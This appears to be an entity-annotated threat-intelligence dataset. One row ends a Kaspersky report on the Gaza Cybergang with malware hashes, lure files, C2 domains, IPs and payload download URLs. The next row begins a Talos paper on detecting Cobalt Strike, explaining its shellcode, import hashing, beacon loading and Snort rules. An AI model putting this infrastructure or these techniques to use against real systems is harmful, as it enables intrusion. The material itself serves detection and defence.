<IOC>f43188accfb6923d62fe265d6d9c0940</IOC>

Filename: <IOC>Gcc-Ksa-uae.exe</IOC>

C2: <IOC>moreoffer[.]life</IOC> (<IOC>185.11.146[.]68</IOC>)

First Seen: <TIMESTAMP>21 March 2017</TIMESTAMP>

Translation: the permanent delegation of the cooperation council for the

<COUNTRY>Arab states of the Gulf</COUNTRY> (<COUNTRY>GCC</COUNTRY>) to the <ORG>United Nation</ORG> and other international

organizations, <CITY>Geneva</CITY>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-5.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-6.png


6.3.
<IOC>056d83c1c1b5f905d18b3c5d58ff5342</IOC>

Filename: exe.مراسلة بخصوص اجتماع رؤساء البعثات

Translation: Correspondence regarding the meeting of <ORG>Heads of Missions</ORG>

(Saudi related)

Parent file: <IOC>fb549e0c2fffd390ee7c4538ff30ac3e</IOC>

C2: <IOC>moreoffer[.]life</IOC>

First Seen: <TIMESTAMP>16 March 2017</TIMESTAMP>

Translation: The fourth foreign meeting of the Kingdom’s head of missions

under the title “message of the embassador”.

6.4.
<IOC>0ee4757ab9040a95e035a667457e4bc6</IOC>

Filename: <IOC>27-4-2017 Fateh Gaza plo.exe</IOC>

C2: <IOC>signup.updatesforme[.]club</IOC>

First seen <TIMESTAMP>27 April 2017</TIMESTAMP>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-7.png


Translation: Clarification report

6.5.
<IOC>7bef124131ffc2ef3db349b980e52847</IOC>

exe. األخ اسماعيل هنية -نائب رئيس المكتب السياسي

(Translation: <IDENTITY>Brother Ismail Haniyah</IDENTITY> – Deputy Head of the <ORG>Political Bureau</ORG>)

C2: <IOC>ping.topsite[.]life</IOC>

First seen: <TIMESTAMP>14 March 2017</TIMESTAMP>

Translation: <IDENTITY>Brother Ismail Haniyah</IDENTITY> – Deputy Head of the <ORG>Political Bureau</ORG>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-8.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-9.png


6.6.
<IOC>70d03e34cadb0f1e1bc6f4bf8486e4e8</IOC>

<IOC>download-file.duckdns[.]org/send/Egyptian_agreement_with_President_Mahmoud_Abbas.exe</IOC>

C1: <IOC>download-file.duckdns[.]org</IOC>

C2: <IOC>ping.topsite[.]life</IOC>

First seen: <TIMESTAMP>30 March 2017</TIMESTAMP>

Translation: methods to apply the palestinian national agreement pact.

6.7.
<IOC>67f48fd24bae3e63b29edccc524f4096</IOC>

C1: http://alasra-paper.duckdns[.]org/send/رسالة_وفد_الرئيس ابومازن_لحماس_في
rar.قطاع_غزة

C2: <IOC>ping.topsite[.]life</IOC>

RAR extracts to: <IOC>5d74487ea96301a933209de3d145105d</IOC>

exe.رسالة_وفد_الرئيس ابومازن_لحماس_في قطاع_غزة

First seen: <TIMESTAMP>17 April 2017</TIMESTAMP>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-10.png


Translation: a severely threatening message from <IDENTITY>Abbas</IDENTITY>’s delegation to <ORG>Hamas</ORG>

6.8.
<IOC>7b536c348a21c309605fa2cd2860a41d</IOC>

C1: http://alasra-paper.duckdns[.]org/send/ورقة_االسرى_المقدمة_لفك_االضراب
.rar

Extracts to: <IOC>d973135041fd26afea926e51ce141198</IOC>, named (<TECHNIQUE>RTLO technique</TECHNIQUE>):

exe. ورقة االسرى المقدمة لفك االضراب

Translation: captives paper submitted to stop the strike

C2:<IOC>ping.topsite[.]life</IOC>

First seen: <TIMESTAMP>17 April 2017</TIMESTAMP>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-11.png


Translation: The primary demands of the captives in the strike of freedom

and dignity

6.9.
<IOC>cf9d89061917e9f48481db80e674f0e9</IOC>

exe. وثائق تنشر ألول مره عن حكم حماس لقطاع غزه
<IOC>c11516cd8c797f0182d63cdf343d08ed</IOC>

Translation: Documents published for the first time on <ORG>Hamas</ORG> ruling of

<COUNTRY>Gaza Strip</COUNTRY>

C1: <IOC>http://hamas-wathaq.duckdns[.]org/send/</IOC>

rar.وثائق_تنشر_ألول_مره_عن_حكم_حماس_لقطاع_غزه

C2:<IOC>ping.topsite[.]life</IOC>

First seen: <TIMESTAMP>16 April 2017</TIMESTAMP>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-12.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-13.png


Translation: Scandals and facts published for the first time on <ORG>Hamas</ORG>’s

ruling of <COUNTRY>Gaza Strip</COUNTRY>

7. Appendix 2: List of IOCs

7.1. Malicious domain names

<IOC>moreoffer[.]life</IOC> 

<IOC>signup.updatesforme[.]club</IOC> 

<IOC>ping.topsite[.]life</IOC> 

<IOC>alasra-paper.duckdns[.]org</IOC> 

<IOC>hamas-wathaq.duckdns[.]org</IOC> 

<IOC>download.data-server.cloudns[.]club</IOC> 

<IOC>upgrade.newshelpyou[.]com</IOC> 

<IOC>manual.newphoneapp[.]com</IOC> 

<IOC>hnoor.newphoneapp[.]com</IOC> 

<IOC>lol.mynetav[.]org</IOC>

7.2. IP addresses

<IOC>138.68.242[.]68</IOC> 

<IOC>185.86.149[.]168</IOC> 

<IOC>185.11.146[.]68</IOC> 

<IOC>45.32.84[.]66</IOC> 

<IOC>45.32.71[.]95</IOC> 

<IOC>107.161.27[.]158</IOC> 

<IOC>46.246.87[.]74</IOC>

7.3. Hashes

MD5

<IOC>87a67371770fda4c2650564cbb00934d</IOC> 

<IOC>4f3b1a2088e473c7d2373849deb4536f</IOC> 

<IOC>c078743eac33df15af2d9a4f24159500</IOC> 

<IOC>3ff60c100b67697163291690e0c2c2b7</IOC> 

<IOC>a3de096598e3c9c8f3ab194edc4caa76</IOC> 

<IOC>7d3426d8eb70e4486e803afb3eeac14f</IOC> 

<IOC>3f67231f30fa742138e713085e1279a6</IOC> 

<IOC>552796e71f7ff304f91b39f5da46499b</IOC> 

<IOC>6fba58b9f9496cc52e78379de9f7f24e</IOC> 

<IOC>eb521caebcf03df561443194c37911a5</IOC> 

<IOC>b68fcf8feb35a00362758fc0f92f7c2e</IOC> 

<IOC>d87c872869023911494305ef4acbd966</IOC> 

<IOC>66f144be4d4ef9c83bea528a4cd3baf3</IOC> 



<IOC>B7390bc8c8a9a71a69ce4cc0c928153b</IOC> 

<IOC>F43188accfb6923d62fe265d6d9c0940</IOC> 

<IOC>056d83c1c1b5f905d18b3c5d58ff5342</IOC> 

<IOC>0ee4757ab9040a95e035a667457e4bc6</IOC> 

<IOC>7bef124131ffc2ef3db349b980e52847</IOC> 

<IOC>70d03e34cadb0f1e1bc6f4bf8486e4e8</IOC> 

<IOC>67f48fd24bae3e63b29edccc524f4096</IOC> 

<IOC>7b536c348a21c309605fa2cd2860a41d</IOC> 

<IOC>cf9d89061917e9f48481db80e674f0e9</IOC> 

<IOC>6d6f34f7cfcb64e44d67638a2f33d619</IOC> 

<IOC>86a89693a273d6962825cf1846c3b6ce</IOC> 

<IOC>5472d0554a0188c0ecebd065eddb9485</IOC>

SHA256

<IOC>0b6fe466a3ba36895208e754b155a193780c79ba8b5c1c9f02c4f7e479116e5f</IOC>

<IOC>0c4aa50c95c990d5c5c55345626155b87625986881a2c066ce032af6871c426a</IOC> 

<IOC>0d235478ae9cc87b7b907181ccd151b618d74955716ba2dbc40a74dc1cdfc4aa</IOC> 

<IOC>1f2b128d26a58a572ea1faee2c4d9dc759eb8add16d9ad0547b3f0305fea212a</IOC> 

<IOC>205f32cc717c2d82baeff9ff5aa9fc31967b6ae5cde22fafe14aec9c9ec62acc</IOC> 

<IOC>284af7a2fafdbff3bbc28b9075f469d2352758b62d182b0e056d29ee74688126</IOC> 

<IOC>344dc6ece5a6dacce9050a65305d4b34865756051a6f414477b6fa381e1c1b63</IOC> 

<IOC>42e4298f5162aba825309673187e27121e3f918238e81f3a6e021c03f3455154</IOC> 

<IOC>44a8d0561a9cc6e24d6935ff4c35b7b7db50c4001eb01c48ea1cfd13253bc694</IOC> 

<IOC>57a12f20c6bbd69b93e76d6d5a31d720046b498aa880b95b85a4f3fda28aac4f</IOC>

<IOC>72b039550d31afaeee11dedf7d80333aeda5c504272d426ae0d91bc0cd82c5b0</IOC> 

<IOC>72d2ad8f38e60c23c96698149507fc627664a5706a4431b96014fbf25495b529</IOC> 

<IOC>788f7fd06030f87d411c61efbc52a3efca03359570353da209b2ce4ccf5b4b70</IOC> 

<IOC>7fcac2f18a8844e4af9f923891cfb6f637a99195a457b6cdb916926d709c6a04</IOC> 

<IOC>84adba3c81ad1c2a8285c31d1171f6f671492d9f3ed5ee2c7af326a9a8dc5278</IOC> 

<IOC>852ccc491204f227c3da58a00f53846296454d124b23021bdb168798c8eee2fb</IOC> 

<IOC>86bd78b4c8c94c046d927fb29ae0b944bf2a8513a378b51b3977b77e59a52806</IOC> 

<IOC>9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7e</IOC>

<IOC>b597d7b5b9c2f1962257f912e911961ad0da4c28fc6a90a0b7db4e242aa007d8</IOC> 

<IOC>bfb88878a22c23138a67cc25872e82d77e54036b846067ddc43e988c50379915</IOC> 

<IOC>c23f715c8588c8d8725352ed515749389d898996107132b2d25749a4efc82a90</IOC> 

<IOC>c47bc2c15f08655d158bb8c9d5254c804c9b6faded526be6879fa94ea4a64f72</IOC> 

<IOC>db53b35c80e8ec3f8782c4d34c83389e8e9b837a6b3cc700c1b566e4e4450ec2</IOC> 

<IOC>dd9debe517717552d7422b08a477faa01badbcc4074830c080a1a1c763e1a544</IOC> 

<IOC>b800d29d6e1f2f85c5bc036e927c1dae745a3c646389599b0754592d76b5564b</IOC>

<THREAT_ACTOR>APT</THREAT_ACTOR>  ARABIC MALWARE  MACROS  MOBILE MALWARE

TARGETED ATTACKS  VULNERABILITIES AND EXPLOITS

Related Posts

    

Analyzing an
exploit for
<CVE>СVE-2017-11826</CVE>

<MALWARE>Bad Rabbit</MALWARE>
ransomware

<THREAT_ACTOR>BlackOasis APT</THREAT_ACTOR>
and new
targeted
attacks
leveraging
zero-day
exploit

https://securelist.com/all?tag=538
https://securelist.com/all?tag=660
https://securelist.com/all?tag=542
https://securelist.com/all?tag=76
https://securelist.com/all?tag=53
https://securelist.com/all?tag=41
https://securelist.com/analyzing-an-exploit-for-%d1%81ve-2017-11826/82869/
https://securelist.com/bad-rabbit-ransomware/82851/
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/",Gaza cybergang;APT;BlackOasis APT,Microsoft Access;Microsoft office;MS Access;Windows;Microsoft Office Word,oil;gas;media/press,Hamas;Kaspersky Lab;Political Bureau;Kaspersky Intelligence Reporting Service;Heads of Missions;Fateh movement;Fateh;GReAT;Palestinian Government;Qatar News Agency;United Nation,"20-06-2017;mid-2017;March 2017;next Tuesday;19-03-2017;17-04-2017;02-02-2017;17 April 2017;since 2012;for more than a year;late April 2017;2017;October 30, 2017. 9:00 am;June 2017;April 2017;25-07-2017;23-03-2017;03-04-2017;27-05-2017;11-05-2017;05-04-2017;21-03-2017;16-03-2017;04-05-2017;27-04-2017;27-4-2017;13-03-2017;12-04-2017;28-03-2017;30-03-2017;23-04-2017;16-04-2017;27 May 2017;starting from 23-04-2017;5 April 2017;21 March 2017;16 March 2017;27 April 2017;14 March 2017;30 March 2017;16 April 2017",Cobaltstrike;Android mobile malware;RATs;Downeks;Android Trojan;Exploit.MSOffice.Generic;Trojan.Win32.Cometer.gen;Trojan.Win32.Generic;Trojan-Downloader.Win32.Downeks;Trojan-Spy.MSIL.Downeks;Win32.Bublik;Win32.Agentb;Remote Access Trojans;Qasar;Mobile malware;Android malware;Quasar;Ole2Link;android Trojan;Bad Rabbit,MENA;Gaza Strip;UAE;Qatar;Middle East North AfricaGaza;Middle East;Arab states of the Gulf;GCC,ping.topsite[.]life;moreoffer[.]life;66f144be4d4ef9c83bea528a4cd3baf3;056d83c1c1b5f905d18b3c5d58ff5342;138.68.242[.]68;87a67371770fda4c2650564cbb00934d;lol.mynetav[.]org;signup.updatesforme[.]club;0ee4757ab9040a95e035a667457e4bc6;7bef124131ffc2ef3db349b980e52847;70d03e34cadb0f1e1bc6f4bf8486e4e8;67f48fd24bae3e63b29edccc524f4096;7b536c348a21c309605fa2cd2860a41d;cf9d89061917e9f48481db80e674f0e9;upgrade.newshelpyou[.]com;552796e71f7ff304f91b39f5da46499b;6fba58b9f9496cc52e78379de9f7f24e;eb521caebcf03df561443194c37911a5;3ff60c100b67697163291690e0c2c2b7;b7390bc8c8a9a71a69ce4cc0c928153b;f43188accfb6923d62fe265d6d9c0940;Gcc-Ksa-uae.exe;4f3b1a2088e473c7d2373849deb4536f;7d3426d8eb70e4486e803afb3eeac14f;b68fcf8feb35a00362758fc0f92f7c2e;d87c872869023911494305ef4acbd966;a3de096598e3c9c8f3ab194edc4caa76;viewimages.exe;c078743eac33df15af2d9a4f24159500;download-file.duckdns[.]org/send/Egyptian_agreement_with_President_Mahmoud_Abbas.exe;alasra-paper.duckdns[.]org;hamas-wathaq.duckdns[.]org;manual.newphoneapp[.]com;86a89693a273d6962825cf1846c3b6ce;SQLiteDatabaseBrowserPortable.exe;3f67231f30fa742138e713085e1279a6;7fcac2f18a8844e4af9f923891cfb6f637a99195a457b6cdb916926d709c6a04;6d6f34f7cfcb64e44d67638a2f33d619;185.11.146[.]68;MOM.InstallProxy.exe;hamas.doc;Notepad.exe;attachment.scr;https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU;Palestinian Retirement Authority Ramallah.exe;Gaza plo.exe;http://download.data-server.cloudns[.]club/indexer.exe;http://download.data-server.cloudns[.]club/wordindexer.exe;http://alasra-paper.duckdns[.]org/send/رسالة_وفد_الرئيسابومازن_لحماس_فيrar;http://alasra-paper.duckdns[.]org/send/ورقة_االسرى_المقدمة_لف rar;http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse.com/Dont-Starve-Pocket-Edition-1.04_ApkHouse.com.apk;Qatar-27-5-2017.rar;GAZA2017.mdb;data-server.cloudns[.]club/wordindexer.exe;data-server.cloudns[.]club/indexer.exe;http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse[.]com/Dont-Starve-Pocket-Edition-1.04_ApkHouse[.]com.apk;Dont-Starve-Pocket-Edition-1.04_ApkHouse[.]com.apk;970e6188561d6c5811a8f99075888d5f;5-4-2017.zip;fb549e0c2fffd390ee7c4538ff30ac3e;27-4-2017 Fateh Gaza plo.exe;download-file.duckdns[.]org;5d74487ea96301a933209de3d145105d;d973135041fd26afea926e51ce141198;c11516cd8c797f0182d63cdf343d08ed;http://hamas-wathaq.duckdns[.]org/send/;download.data-server.cloudns[.]club;hnoor.newphoneapp[.]com;185.86.149[.]168;45.32.84[.]66;45.32.71[.]95;107.161.27[.]158;46.246.87[.]74;B7390bc8c8a9a71a69ce4cc0c928153b;F43188accfb6923d62fe265d6d9c0940;5472d0554a0188c0ecebd065eddb9485;0b6fe466a3ba36895208e754b155a193780c79ba8b5c1c9f02c4f7e479116e5f;0c4aa50c95c990d5c5c55345626155b87625986881a2c066ce032af6871c426a;0d235478ae9cc87b7b907181ccd151b618d74955716ba2dbc40a74dc1cdfc4aa;1f2b128d26a58a572ea1faee2c4d9dc759eb8add16d9ad0547b3f0305fea212a;205f32cc717c2d82baeff9ff5aa9fc31967b6ae5cde22fafe14aec9c9ec62acc;284af7a2fafdbff3bbc28b9075f469d2352758b62d182b0e056d29ee74688126;344dc6ece5a6dacce9050a65305d4b34865756051a6f414477b6fa381e1c1b63;42e4298f5162aba825309673187e27121e3f918238e81f3a6e021c03f3455154;44a8d0561a9cc6e24d6935ff4c35b7b7db50c4001eb01c48ea1cfd13253bc694;57a12f20c6bbd69b93e76d6d5a31d720046b498aa880b95b85a4f3fda28aac4f;72b039550d31afaeee11dedf7d80333aeda5c504272d426ae0d91bc0cd82c5b0;72d2ad8f38e60c23c96698149507fc627664a5706a4431b96014fbf25495b529;788f7fd06030f87d411c61efbc52a3efca03359570353da209b2ce4ccf5b4b70;84adba3c81ad1c2a8285c31d1171f6f671492d9f3ed5ee2c7af326a9a8dc5278;852ccc491204f227c3da58a00f53846296454d124b23021bdb168798c8eee2fb;86bd78b4c8c94c046d927fb29ae0b944bf2a8513a378b51b3977b77e59a52806;9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7e;b597d7b5b9c2f1962257f912e911961ad0da4c28fc6a90a0b7db4e242aa007d8;bfb88878a22c23138a67cc25872e82d77e54036b846067ddc43e988c50379915;c23f715c8588c8d8725352ed515749389d898996107132b2d25749a4efc82a90;c47bc2c15f08655d158bb8c9d5254c804c9b6faded526be6879fa94ea4a64f72;db53b35c80e8ec3f8782c4d34c83389e8e9b837a6b3cc700c1b566e4e4450ec2;dd9debe517717552d7422b08a477faa01badbcc4074830c080a1a1c763e1a544;b800d29d6e1f2f85c5bc036e927c1dae745a3c646389599b0754592d76b5564b,Emir of Qatar;Brother Ismail Haniyah;Brother Ismail Haniyeh;Abu Mazen;Abbas,,,,,,RTLO technique,Gaza;Geneva,CVE 2017-0199;CVE-2017-0199;СVE-2017-11826,14,13,6,25,50,29,18,161,7,0,0,0,0,0,1,3,9
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"page 1 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science  
of detecting <MALWARE>Cobalt Strike</MALWARE>
BY <IDENTITY>NICK MAVIS</IDENTITY>

EDITED BY <IDENTITY>JOE MARSHALL</IDENTITY> AND <IDENTITY>JON MUNSHAW</IDENTITY>

Updated <TIMESTAMP>September 11, 2020</TIMESTAMP>

https://twitter.com/nickmavis


page 2 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@Cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

TABLE OF CONTENTS
Introduction ................................................................................................................................................................................ 3

Getting up to speed .................................................................................................................................................................... 3

Listeners ........................................................................................................................................................................... 3

Web management ............................................................................................................................................................. 4

Reporting .......................................................................................................................................................................... 5

Attack analysis ........................................................................................................................................................................... 5

Target Module: Raw Shellcode generator ......................................................................................................................... 5

Execution .......................................................................................................................................................................... 5

Detection .......................................................................................................................................................................... 7

Target module: Staged/stageless executable generator ................................................................................................... 8

C2 Communication ......................................................................................................................................................... 10

Target Module: HTML application attack generator ........................................................................................................ 13

Target Module: Scripted web delivery ............................................................................................................................. 16

Target Module: Signed Java Applet Attack ..................................................................................................................... 17

Target Module: Smart Java Applet Attack ....................................................................................................................... 18

Target module: System profiler ....................................................................................................................................... 24

Conclusion ................................................................................................................................................................................ 26

Appendix A: Coverage.............................................................................................................................................................. 27

Staged/Stageless Executables ....................................................................................................................................... 27

Scripted Web Delivery <SOFTWARE>PowerShell</SOFTWARE> .................................................................................................................................. 27

Beacon Binary Payloads .................................................................................................................................................. 27

Beacon <SOFTWARE>PowerShell</SOFTWARE> payloads .......................................................................................................................................... 27

HTML Application (HTA) Attacks ..................................................................................................................................... 27

<MALWARE>Cobalt Strike</MALWARE> signed applet attack .................................................................................................................................. 28

<MALWARE>Cobalt Strike</MALWARE> smart applet attack .................................................................................................................................... 28

<MALWARE>Cobalt Strike</MALWARE> system profiler attack ................................................................................................................................ 28



page 3 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

INTRODUCTION
<MALWARE>Cobalt Strike</MALWARE> is ubiquitous in the cyber security arena. It’s 
a prolific toolkit used at many levels of intrusion to solve 
adversaries' problems like post-intrusion exploitation, 
beaconing for command and control (C2s), stealth and 
reconnaissance.

<MALWARE>Cobalt Strike</MALWARE> is a modularized attack framework: Each 
module fulfills a specific function and stands alone. It’s hard 
to detect, because its components might be customized 
derivatives from another module, new, or completely 
absent. Malicious actors find <MALWARE>Cobalt Strike</MALWARE>’s obfuscation 
techniques and robust tools for C2, stealth and data 
exfiltration particularly attractive.

<ORG>Cisco</ORG> Talos recently updated its <SOFTWARE>SNORT</SOFTWARE>® and <SOFTWARE>ClamAV</SOFTWARE>® 
signatures to detect <MALWARE>Cobalt Strike</MALWARE>, version 4.0, a common 
platform utilized as one part of attack processes. This 
paper outlines the challenges we were confronted with 
when analyzing <MALWARE>Cobalt Strike</MALWARE>, and the ways we crafted our 
detection. We will address all the modules we’ve updated 
coverage for, how we analyzed and thought about detection 
and the signature that resulted.

GETTING UP TO SPEED
<MALWARE>Cobalt Strike</MALWARE> is a paid penetration-testing tool that anyone 
can use. Malicious actors have used it for years to deploy 
“Listeners” on victim machines. In this paper, we’ll dive into 
some of the core components of <MALWARE>Cobalt Strike</MALWARE> and then 
break down our analysis of these components and how we 
can protect against them. We will also look at <MALWARE>Cobalt Strike</MALWARE> 
from the adversary’s perspective.

LISTENERS

Listeners are at the core of <MALWARE>Cobalt Strike</MALWARE>. They allow 
adversaries to configure the C2 method used in an attack. 
Every attack or payload generated in <MALWARE>Cobalt Strike</MALWARE> requires 
the targeted user to select a Listener to embed within 
it. This will determine how an infected host will reach 
out to the C2 server to retrieve additional payloads and 
instructions.

When creating a listener, the user can configure the payload 
type, name, C2 server and port, and other various options 
such as named pipes or proxy servers (Figure 1). Users can 
choose from:

• Beacon DNS

• Beacon HTTP

• Beacon HTTPS

• Beacon SMB

• Beacon TCP

• External C2

• Foreign HTTP

• Foriegn HTTPS

Potentially the most powerful aspect of <MALWARE>Cobalt Strike</MALWARE> is 
the array of malleable C2 profiles, which allows users to 
configure how attacks are created, obfuscate and manage 
the flow of execution at a very low level.

There are several ways to visualize how an adversary 
interacts with infected <MALWARE>Cobalt Strike</MALWARE> hosts, such as a 
session table, pivot graph, or a target table. In Figure 2, 
you can see the session table, along with some options 
available when selecting a host.

Figure 1: <MALWARE>Cobalt Strike</MALWARE> Listener console



page 4 of 29© 2020 Cisco. All rights reserved. talos-external@<ORG>Cisco</ORG>.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

However, this does not give insight into how the hosts are 
interconnected, nor the C2 path taken when contacting the 
<MALWARE>Cobalt Strike</MALWARE> C2. For that, we can swap to the Pivot Graph 
(Figure 3).

In Figure 3, the `WIN-498IQCJRIUQ` host is connected through 
“DESKTOP-R8VN37V” and all C2 operations are executed 
using that path. Listeners that are designed only to connect 
infected hosts laterally include the SMB and TCP beacons.

Attackers can also control hosts through the interactive beacon 
console. This allows for more advanced control of a host.

WEB MANAGEMENT

<MALWARE>Cobalt Strike</MALWARE> delivers exploits and/or malicious payloads 
using an attacker-controlled web server. The web server 
can be configured to perform the following actions:

• Host files

• Clone an existing website to trick users

• Scripted web delivery

• Signed Applet Attack (<SOFTWARE>Java</SOFTWARE>)

• Smart Applet Attack (<SOFTWARE>Java</SOFTWARE>)

• System profiling

Figure 4 shows how an adversary would manage the 
“Sites” console from their end. In this example, we’re 
hosting a malicious <SOFTWARE>PowerShell</SOFTWARE> script on the ‘/malware’ 
URI over port 80.

You can also see that the HTTP based listeners are also 
present as they are used to deliver additional payloads and 
C2 commands to victims.

When a victim reaches out to the <MALWARE>Cobalt Strike</MALWARE> web server, 
it’s logged for operators.

Figure 2: <MALWARE>Cobalt Strike</MALWARE> session table

Figure 4

Figure 3: <MALWARE>Cobalt Strike</MALWARE> Pivot Table



page 5 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

REPORTING

<MALWARE>Cobalt Strike</MALWARE> offers a variety of report generators to get a 
complete breakdown of the infected hosts and associated data.

Available options include:

• Activity report

• Hosts report

• Indicators of compromise

• Sessions report

• Social engineering report

• Tactics, techniques and procedures

ATTACK ANALYSIS

TARGET MODULE: RAW SHELLCODE GENERATOR

<MALWARE>Cobalt Strike</MALWARE> generates raw, malicious payloads that an 
attacker could implement into other attacks. The payload 
can be generated as raw shell code or preformatted in 

almost any language desired, including <SOFTWARE>PowerShell</SOFTWARE>, Python 
and <SOFTWARE>Java</SOFTWARE>, among many others. When generating raw 
payloads, the user is presented with only the HTTP, HTTPS 
and DNS beacons to choose from. The generated payload 
can act as a staging payload for the <MALWARE>Cobalt</MALWARE> beacon, to be 
plugged into an exploit of their choice.

For analysis, we only concentrated on the x86 and x64 
binary payloads generated in C. No matter the code 
selected, the resulting payload isn’t designed to execute by 
itself. The generator’s primary function is to format the shell 
code in a way that allows the user to drop in a third-party 
exploit or custom exploits and have it preformatted in that 
particular programming language.

Figure 5 shows a payload generated with the x86 HTTP listener.

EXECUTION

Since the payload is only a bunch of raw bytes, it won’t 
just run if a user double-clicked the file. The adversary 
would have to load the shellcode and jump to the desired 
entry point. This is trivial — we can use a quick C script that 

Figure 5: <MALWARE>Cobalt Strike</MALWARE> payload generated with x86 HTTP Listener.



page 6 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

loads the desired shellcode and then 
executes it as if it were a function. 
This enables defenders to quickly 
analyze shell code in some cases 
without having to perform any over-
the-top attempts to load it (Figure 6).

Once the buffer is allocated and 
called, we can see the start of the 
<MALWARE>Cobalt Strike</MALWARE> shellcode in Figure 7.

It starts with a common shellcode 
instruction `cld`, which is used to 
make sure strings are processed 
from left to right by clearing the 
Direction Flag (DF). Then, we 
immediately call the first function to 
import “wininet.dll” (Figure 8).

Immediately, we can see a string 
for “wininet”, and a four-byte hex 
value pushed onto the stack, and an 
indirect register call on `ebp`, which 
currently points to the first instruction 
after `shellcode_main()` [shellcode_
main+0x6].

The shellcode is unaware of the 
libraries it needs to execute and 
needs to import them. This technique 
is often used by malware to 
obfuscate calls to the <SOFTWARE>Windows API</SOFTWARE> 
by resolving imports using a hash of 
the function. This one, in particular, 
is a modified version of <TOOL>Metasploit</TOOL>'s 
“reverse_http” shellcode (Figure 9).

Figure 10 shows a pointer to the 
Process Environment Block (PEB) 
and the PEB_LDR_DATA data 
structure within. This target is the 
`InMemoryOrderModuleList,̀  which 
contains a list of all modules loaded 
in memory. By traversing this list, 
we can also get a list of functions 
available within each module. <MALWARE>Cobalt Strike</MALWARE> iterates over each DLL, 
converts the full name to lowercase 
and begins to calculate a hash 
value of each export using the full 
DLL name and the desired function 

Figure 6

Figure 7

Figure 8

Figure 9

https://en.wikipedia.org/wiki/Process_Environment_Block


page 7 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

name. The hashing algorithm used is 
a simple ROR13, the same one used 
by <TOOL>Metasploit</TOOL>.

The retrieved DLL + Function name 
is compared to a calculated hash 
against the hex value (0x726774C) 
passed in earlier as an argument 
to `call_by_hash()`. If the match is 
successful, <MALWARE>Cobalt Strike</MALWARE> calls that 
function immediately with the other 
arguments passed.

Figure 11 shows the relevant 
functionality from the <TOOL>Metasploit</TOOL>’s 
`hash.py:̀

The payload makes an outbound 
HTTP call to the configured HTTP 
C2 server.

The <MALWARE>Cobalt Strike</MALWARE> C2 server responds 
with an HTTP 200 OK, containing a 
very large binary blob. This blob is 
the core functionality of <MALWARE>Cobalt Strike</MALWARE>, 
better known as “<IOC>beacon.dll</IOC>.” From 
here on out, this is the code that will 
be used to control an infected host. 
After retrieving the DLL, it is loaded 
via a technique called <MITRE_ATTACK>Reflective DLL injection</MITRE_ATTACK>.

DETECTION

Now that we have a good 
understanding of how a <MALWARE>Cobalt Strike</MALWARE> payload works, we can work 
on creating detection for these 
payloads. The goal when creating 
detection content is to cover 
something in its entirety, with the 
fewest rules, without triggering false 
positives. This, for the most part, 
ensures we are creating generic 
detection rather than something that 
only targets one thing. At Talos, we 
want our detection to catch variants 
and potential future threats.

When looking into coverage for the 
<MALWARE>Cobalt Strike</MALWARE> payloads, we found we 

Figure 10

Figure 11

https://www.google.com/url?q=https://attack.mitre.org/techniques//001/&sa=D&ust=1596559074788000&usg=AFQjCNGxlDBHg3K-731T8ArLHwcCpVrVXQ
https://www.google.com/url?q=https://attack.mitre.org/techniques//001/&sa=D&ust=1596559074788000&usg=AFQjCNGxlDBHg3K-731T8ArLHwcCpVrVXQ


page 8 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

had some prior coverage alerting on the payloads, including 
these <SOFTWARE>Snort</SOFTWARE> rules:

• 1:15306:22

• 1:11192:20

• 1:30471:3

• 1:30229:3

The first two are generic file type detection rules that are 
the base for setting flowbits in <SOFTWARE>Snort</SOFTWARE> and can be ignored. 
However, SIDs 1:30471 and 1:30229 are <TOOL>Metasploit</TOOL> 
shellcode rules we released years ago that still apply here.

At the time, these rules were suspected to be false positive 
prone and were not enabled by default in policy. We can’t 
narrow them down to a specific type or protocol. Therefore, 
we have to remove a lot of checks that tell <SOFTWARE>Snort</SOFTWARE> whether or 
not to inspect a packet further and re-enabled them.

The key element here is the <SOFTWARE>Snort</SOFTWARE> header, `alert tcp any 
any -> any any`. Most <SOFTWARE>Snort</SOFTWARE> rules will declare a traffic 
direction (coming from or going to the user’s network) 
and the applicable port ranges. Since this raw shellcode 
can be used with potentially any exploit over an unknown 
protocol or port, we can’t narrow it down to inspection on 
for example just port 80. We also don’t know if a host is 
compromised already and attempting to move laterally, so 
we can’t specify the source and destination networks. This 
means that <SOFTWARE>Snort</SOFTWARE> will attempt to match this particular byte 
sequence on all TCP traffic crossing the sensor. Not only 
